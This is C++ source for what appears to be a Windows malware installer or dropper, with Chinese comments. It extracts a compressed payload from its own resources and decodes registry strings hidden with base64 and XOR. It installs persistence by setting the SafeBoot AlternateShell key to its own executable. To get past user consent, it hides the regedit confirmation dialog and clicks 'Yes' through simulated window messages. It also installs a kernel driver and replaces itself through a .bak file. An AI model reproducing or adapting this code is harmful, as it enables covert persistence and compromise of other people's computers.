// MyCommon.cpp: implementation of the MyCommon class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "MyCommon.h"
#include "resource.h"
#include "resetssdt.h"

#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")



#include "../WdkPath\controdefl.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char MyCommon::base64[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
char MyCommon::EncodeString[MAX_CONFIG_LEN] = {0};
char MyCommon::ServiceConfig[MAX_CONFIG_LEN] = {0};
char MyCommon::szDllPath[MAX_PATH]= {0};
char MyCommon::szServerName[32]= {0};
char MyCommon::szServerDesName[MAX_PATH]= {0};
char MyCommon::szServerDescription[MAX_CONFIG_LEN]= {0};

CHAR MyCommon::m_InstallName[32] = {0};

int MyCommon::m_nRegDlgCount = 3;

//#define DOS_DEVICE_NAME "\\\\.\\ctfmon"




MyCommon::MyCommon()
{

}

MyCommon::~MyCommon()
{

}




BOOL MyCommon::ReleaseResource( WORD wResourceID, LPCSTR lpType, LPCSTR lpFileName, PCHAR lpConfigString )
{
	HGLOBAL hRes = NULL;
	HRSRC hResInfo = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwBytes = 0;
	BOOL bRet = FALSE;
	BYTE *pBufUnCompress = NULL;

	do 
	{	
		hResInfo = FindResourceA( NULL, MAKEINTRESOURCE(wResourceID), lpType);
		if (hResInfo == NULL)
		{
			break;
		}

		hRes = LoadResource( NULL, hResInfo);
		if (hRes == NULL)
		{
			break;
		}

		hFile = CreateFileA
			(
			lpFileName, 
			GENERIC_READ|GENERIC_WRITE,
			NULL,//独占
			NULL,
			CREATE_ALWAYS,//存在时覆盖原有文件
			FILE_ATTRIBUTE_NORMAL,
			NULL
			);

		if (hFile == INVALID_HANDLE_VALUE) 
		{
			break;
		}

		//解密资源
		ULONG nUnCompressSize = *(ULONG *)hRes;
		if (nUnCompressSize > 1024* 1024)
		{
			break;
		}

		pBufUnCompress = new BYTE[nUnCompressSize];
		BYTE *pCompressBuf = (BYTE *)hRes+4;
		int nCompressSize = SizeofResource(NULL, hResInfo) - 4;
// 		typedef int (__stdcall *pFunUnCompress)(LPBYTE, ULONG*, LPBYTE, int);
// 		pFunUnCompress funUncompress = (pFunUnCompress)&uncompress;
		int nProcess = uncompress(pBufUnCompress, &nUnCompressSize, pCompressBuf, nCompressSize);
		if (Z_OK != nProcess)
		{
			break;
		}


		WriteFile(hFile, pBufUnCompress, nUnCompressSize, &dwBytes, NULL);
		// 写入配置
		if (lpConfigString != NULL)
		{
			WriteFile(hFile, lpConfigString, lstrlenA(lpConfigString) + 1, &dwBytes, NULL);
		}
		bRet = TRUE;

	} while (FALSE);

	if (INVALID_HANDLE_VALUE != hFile)
	{
		CloseHandle(hFile);
	}
	if (NULL != hRes)
	{
		FreeResource(hRes);
	}

	if (NULL != pBufUnCompress)
	{
		delete[] pBufUnCompress;
	}
	//	SetFileAttributes(lpFileName, FILE_ATTRIBUTE_HIDDEN);
	return bRet;
}


LPBYTE MyCommon::FindConfigString( WORD wResourceID, LPCSTR lpType )
{
	LPBYTE Ret = NULL;
	HGLOBAL hRes;
	HRSRC hResInfo;
	DWORD Res_Size = 0;
	hResInfo = FindResourceA( NULL, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return NULL;
	hRes = LoadResource( NULL, hResInfo);
	if (hRes == NULL) return NULL;
	Res_Size = SizeofResource(NULL, hResInfo);
	Ret = new BYTE[Res_Size+1];
	memset( Ret, 0, Res_Size+1 );
	memcpy( Ret, hRes, Res_Size );
	FreeResource(hRes);
	return Ret;
}

int MyCommon::pos(char c)
{
	char *p;
	for(p = base64; *p; p++)
		if(*p == c)
			return p - base64;
		return -1;
}

int MyCommon::base64_decode(const char *str, char **data)
{
	const char *s, *p;
	unsigned char *q;
	int c;
	int x;
	int done = 0;
	int len;
	s = (const char *)malloc(strlen(str));
	q = (unsigned char *)s;
	for(p=str; *p && !done; p+=4){
		x = pos(p[0]);
		if(x >= 0)
			c = x;
		else{
			done = 3;
			break;
		}
		c*=64;
		
		x = pos(p[1]);
		if(x >= 0)
			c += x;
		else
			return -1;
		c*=64;
		
		if(p[2] == '=')
			done++;
		else{
			x = pos(p[2]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		c*=64;
		
		if(p[3] == '=')
			done++;
		else{
			if(done)
				return -1;
			x = pos(p[3]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		if(done < 3)
			*q++=(c&0x00ff0000)>>16;
		
		if(done < 2)
			*q++=(c&0x0000ff00)>>8;
		if(done < 1)
			*q++=(c&0x000000ff)>>0;
	}
	
	len = q - (unsigned char*)(s);
	
	*data = (char*)realloc((void *)s, len);
	
	return len;
}

char* MyCommon::MyDecode(char *str)
{
	int		i = 0, len = 0;
	char	*data = NULL;
	len = base64_decode(str, &data);
	
	while( i < len )
	{
		data[i] -= 0x6;
		data[i] ^= 0x12;
		i++;
	}
	return data;
}

// BOOL MyCommon::StartService(LPCSTR lpService)
// {
// 	BOOL bRet=FALSE;
// 	do 
// 	{
// 		SC_HANDLE hSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
// 		if ( NULL != hSCManager )
// 		{
// 			SC_HANDLE hService = OpenServiceA(hSCManager, lpService, SERVICE_ALL_ACCESS );
// 			if ( NULL != hService )
// 			{	
// 				ChangeServiceConfig( hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE,NULL, NULL, NULL, NULL, NULL, NULL, NULL);
// 				::StartService(hService, 0, NULL);
// 				CloseServiceHandle( hService );
// 			}
// 			CloseServiceHandle( hSCManager );
// 		}
// 	} while (FALSE);
// 
// 	return bRet;
// }

BOOL MyCommon::SetSvcHostReg(LPCSTR lpDstFileName,DWORD dwFlag)
{
	CHAR FilePath[MAX_PATH] = {0};
	int nRet = ::GetTempPath(MAX_PATH, FilePath);
	if (nRet <= 0)
	{
		return FALSE;
	}

	CHAR szTempPath[MAX_PATH] = {0};
	CHAR szFolderName[32] = {0};
	wsprintfA(szFolderName, "%d", GetTickCount());
	wsprintfA(szTempPath, "%s%s\\", FilePath, szFolderName);
	BOOL bRet = CreateDirectoryA(szTempPath, NULL);
	if (!bRet)
	{
		return FALSE;
	}

	//写入注册文件
	CHAR szRegPath[MAX_PATH] = {0};
	wsprintfA(szRegPath, "%sschedule.reg", szTempPath);

	HANDLE hFileBat = ::CreateFileA(szRegPath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hFileBat)
	{
		return FALSE;
	}

	CHAR bufContent[1024] = {0};	
	CHAR bufFileName[MAX_PATH] = {0};
	int nLen = lstrlenA(lpDstFileName);
	for (int i=0,j=0; i<nLen; i++, j++)
	{
		bufFileName[j] = lpDstFileName[i];
		if (bufFileName[j]== '\\')
		{
			j++;
			bufFileName[j] = '\\';
		}
	}

	//HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
// 	if (dwFlag)
// 	{
// 		wsprintfA(bufContent, ("Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]\r\n\"svchost\"=\"%s\""),bufFileName);
// 
// 		//wsprintfA(bufContent, ("Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"svchost\"=\"%s\""),bufFileName);
// 
// 	}
// 	else 


	//::wsprintfA(bufContent, ("Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot]\r\n\"UseAlternateShell\"=dword:00000001\r\n\"AlternateShell\"=\"%s\"\r\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\option]\r\n\"UseAlternateShell\"=dword:00000001\r\n\"AlternateShell\"=\"%s\""), bufFileName, bufFileName);

	::wsprintfA(bufContent, ("%s\r\n\r\n%s\r\n%s\r\n%s=\"%s\"\r\n%s\r\n%s\r\n%s=\"%s\""),
		MyDecode("S4GCfINrZzhGfXuBZ2xmcThdfIFsg2Y4Sn1mZ4GDgjgtQigoGA=="), //Windows Registry Editor Version 5.00
		MyDecode("T2BfXVFTZGNXWWRTZVlXYGFiXVRHUUdMXWVUV21mZn2CbFeDgmxmg4RHfWxUV4OCbGaDhFRHeXp9VoODbFUY"),//[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot]
		MyDecode("Nk1nfVmEbH1mgnlsfUeAfYSENjV8a4NmfC4oKCgoKCgoKRg="),//"UseAlternateShell"=dword:00000001
		MyDecode("NlmEbH1mgnlsfUeAfYSENhg="),//"AlternateShell"
		bufFileName, 
		MyDecode("T2BfXVFTZGNXWWRTZVlXYGFiXVRHUUdMXWVUV21mZn2CbFeDgmxmg4RHfWxUV4OCbGaDhFRHeXp9VoODbFSDaGyBg4JVGA=="),//[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\option]
		MyDecode("Nk1nfVmEbH1mgnlsfUeAfYSENjV8a4NmfC4oKCgoKCgoKRg="),//"UseAlternateShell"=dword:00000001
		MyDecode("NlmEbH1mgnlsfUeAfYSENhg="),//"AlternateShell"
		bufFileName);
	
	DWORD dwWrite = 0;
	
	bRet = ::WriteFile(hFileBat, bufContent, lstrlenA(bufContent), &dwWrite, NULL);
	::CloseHandle(hFileBat);
	if (!bRet || dwWrite != lstrlenA(bufContent))
	{
		return FALSE;
	}


	STARTUPINFOA si = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = {0};	

	//获取windows安装目录
	CHAR szWindowsPath[MAX_PATH] = {0};
	CHAR szCmd[MAX_PATH] = {0};
	GetWindowsDirectoryA(szWindowsPath, MAX_PATH * sizeof(CHAR));

	if (dwFlag)
	{
		wsprintfA(szCmd, "%s\\regedit.exe /s, %s", szWindowsPath, szRegPath);
		CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); 

		return TRUE;
	}

	wsprintfA(szCmd, "%s\\explorer.exe /select, %s", szWindowsPath, szRegPath);

	if (!::CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) 
	{
		return FALSE;
	}

	::WaitForSingleObject(pi.hProcess ,5*1000);

	::Sleep(1000);
	//发送指令使其运行
	HWND hWnd =  ::FindWindowA(NULL, szFolderName);
	CHAR szLongPath[MAX_PATH] = {0};

	if (NULL == hWnd)
	{		
		GetLongPathNameA(szTempPath, szLongPath,MAX_PATH);
		if (0 != lstrlenA(szLongPath))
		{
			szLongPath[lstrlenA(szLongPath)-1] = 0;
		}		

		hWnd = ::FindWindowA(NULL, szLongPath);
	}

	if (NULL == hWnd)
	{
// 		::ZeroMemory(szTempPath, sizeof(szTempPath));
		GetShortPathNameA(szLongPath, szTempPath, MAX_PATH);
		if (0 != lstrlenA(szTempPath))
		{
			szTempPath[lstrlenA(szTempPath)-1] = 0;
		}
		
		hWnd = ::FindWindowA(NULL, szTempPath);
	}

	if (NULL == hWnd)
	{
		OutputDebugString(TEXT("not Find hwnd"));

		return FALSE;
	}

	EnumChildWindows(hWnd, CommEnumWindowsProc, (LPARAM)NULL);

	int nTryTime = 1000;
	char ttt[1024] = {0};
	while (m_nRegDlgCount && nTryTime--)
	{
		::wsprintfA(bufContent, MyDecode("y7am+akFqfi0xdrrGA=="));
		HWND hWndReg =  ::FindWindowA("#32770", bufContent);
		if (NULL == hWndReg)
		{			
			Sleep(20);
			continue;
		}


		wsprintfA(ttt, "dlgcount %d ", m_nRegDlgCount);
		OutputDebugString(ttt);
		ShowWindow(hWndReg, SW_HIDE);

		EnumChildWindows(hWndReg, CommRegWindowsProc, (LPARAM)hWndReg);		
	}

	wsprintfA(ttt, "NTrytime %d ", nTryTime);
	OutputDebugString(ttt);

	return TRUE;	
}


BOOL CALLBACK MyCommon::CommEnumWindowsProc(HWND hWnd, LPARAM lParam)
{	
	CHAR szWindowText[MAX_PATH] = {0};
	CHAR szClassName[MAX_PATH] = {0};

	::GetWindowTextA(hWnd, szWindowText, MAX_PATH);
	::GetClassNameA(hWnd, szClassName, MAX_PATH);

	if ( 0 == lstrcmpiA(szWindowText, "FolderView") &&  0 == lstrcmpiA(szClassName, "SysListView32"))
	{
		//_asm int 3
		::SendMessage(hWnd, WM_KEYDOWN, VK_RETURN, NULL);
		::SendMessage(hWnd, WM_KEYUP, VK_RETURN, NULL);	
	}


	return TRUE;
}


BOOL CALLBACK MyCommon::CommRegWindowsProc(HWND hWnd, LPARAM lParam)
{	
	CHAR szWindowText[MAX_PATH] = {0};
	CHAR szClassName[MAX_PATH] = {0};

	::GetWindowTextA(hWnd, szWindowText, MAX_PATH);
	::GetClassNameA(hWnd, szClassName, MAX_PATH);

	if ( NULL != strstr(szWindowText, "schedule.reg") &&  0 == lstrcmpiA(szClassName, "static"))
	{		
		// 		::SendMessage((HWND)hWnd, WM_KEYDOWN, VK_RETURN, NULL);
		// 		::SendMessage((HWND)hWnd, WM_KEYUP, VK_RETURN, NULL);	
		::SendMessage((HWND)lParam, WM_COMMAND, IDYES, 0);
		m_nRegDlgCount--;
	}

	return TRUE;
}

BOOL MyCommon::IsServerStart(CHAR *szDeviceName)
{
	CHAR szDosName[MAX_PATH]={0};
	wsprintf(szDosName,"\\\\.\\%s",szDeviceName);
	HANDLE hDriver = CreateFile(szDosName,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		CloseHandle(hDriver);
		return TRUE;
	}
	return FALSE;

}

BOOL MyCommon::InstallService(LPCSTR lpServiceName,LPCSTR lpDriverPath,CHAR *szDeviceName)
{
	BOOL bResult=FALSE;
	SC_HANDLE hSCManager=0;
	HANDLE hDriver=INVALID_HANDLE_VALUE;
	CHAR szDosName[MAX_PATH]={0};
	wsprintf(szDosName,"\\\\.\\%s",szDeviceName);

	do 
	{
// 		hDriver = CreateFile(szDosName,
// 			GENERIC_READ | GENERIC_WRITE,
// 			0,
// 			NULL,
// 			OPEN_EXISTING,
// 			FILE_ATTRIBUTE_NORMAL,
// 			NULL);
// 		if (hDriver!=INVALID_HANDLE_VALUE) break;

		//RemoveDriver(lpServiceName);
		InstallDriver((LPCTSTR)lpServiceName,(PSTR)lpDriverPath);
	//	bResult = StartDriver(lpServiceName);
	} while (FALSE);
	if (hDriver!=INVALID_HANDLE_VALUE){
		CloseHandle(hDriver);
	}

	return bResult;
}

DWORD WINAPI MyCommon::MY_INSTALL(LPVOID lparam)
{
	//自身全路径
	CHAR szFileBakName[MAX_PATH] = {0};
	CHAR szFileSelfName[MAX_PATH] = {0};
	GetModuleFileNameA(NULL, szFileSelfName, sizeof(szFileSelfName));
	wsprintf(szFileBakName, "%s.bak", szFileSelfName);

	if (PathFileExists(szFileBakName))//需要升级
	{
		return UpdateServer(szFileBakName, szFileSelfName);
	}

	BOOL bDelete = FALSE;
	char *pos = NULL;
	char *lpEncodeString = (char*)MyCommon::FindConfigString(IDR_ENCODE, "InFormation" );
	if (!lpEncodeString) 
	{
		return -2;
	}

	HANDLE	hMutex = CreateMutexA(NULL, TRUE, lpEncodeString);
	DWORD	dwLastError = GetLastError();
	if (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED) 
	{
		return -2;
	}

	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	lstrcpyA( MyCommon::EncodeString, lpEncodeString );
	char *lpServiceConfig = (char*)MyCommon::FindConfigString( IDR_CONFIG, "InFormation" );
	if (!lpServiceConfig) 
	{
		return -1;
	}

	pos = strstr( lpServiceConfig, "()" );
	if (pos)
	{
		*pos = '\0';
		bDelete = TRUE;
	}
	lstrcpyA( MyCommon::ServiceConfig, lpServiceConfig );
	pos = strchr( MyCommon::ServiceConfig, '|' );
	if (!pos) 
	{
		return -2;
	}

	*pos = '\0';
	char *lpServiceDisplayName = MyCommon::MyDecode( (char*)MyCommon::ServiceConfig );
	if (!lpServiceDisplayName) 
	{
		return -1;
	}

	char *lpServiceDescription = MyCommon::MyDecode(pos + 1);
	if (!lpServiceDescription) 
	{
		return -2;
	}

// 	CHAR *InstallServiceName = (CHAR*)MyCommon::InstallService( lpServiceDisplayName, lpServiceDescription, MyCommon::EncodeString);
// 	if (InstallServiceName)
// 	{
// 		StartDriver(InstallServiceName);
// 	}

	return 0;
}

DWORD WINAPI MyCommon::Uninstall(LPSTR lpBakFile, LPSTR lpSelfFile)
{
	TCHAR strRandomFile[MAX_PATH] = {0};
	//删除安装文件
	wsprintf(strRandomFile, "%d.bak", GetTickCount());

	MoveFile(lpSelfFile, strRandomFile);
	DeleteFile(strRandomFile);

	//将bak文件覆盖原始文件达到更新目的
	MoveFile(lpBakFile, lpSelfFile);

	return 0;
}


DWORD WINAPI MyCommon::UpdateServer(LPSTR lpFileBakName, LPSTR lpFileSelfName)
{
	Uninstall(lpFileBakName, lpFileSelfName);

	STARTUPINFOA si = {0};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW; 
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = {0};
	CHAR szCommand[MAX_PATH] = {0};
	wsprintfA(szCommand, "%s", lpFileSelfName);
	BOOL bRet = CreateProcessA(NULL, szCommand, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (bRet)
	{
		WaitForSingleObject(pi.hProcess, 5*1000);
		CloseHandle(pi.hProcess);
	}

	return 0;
}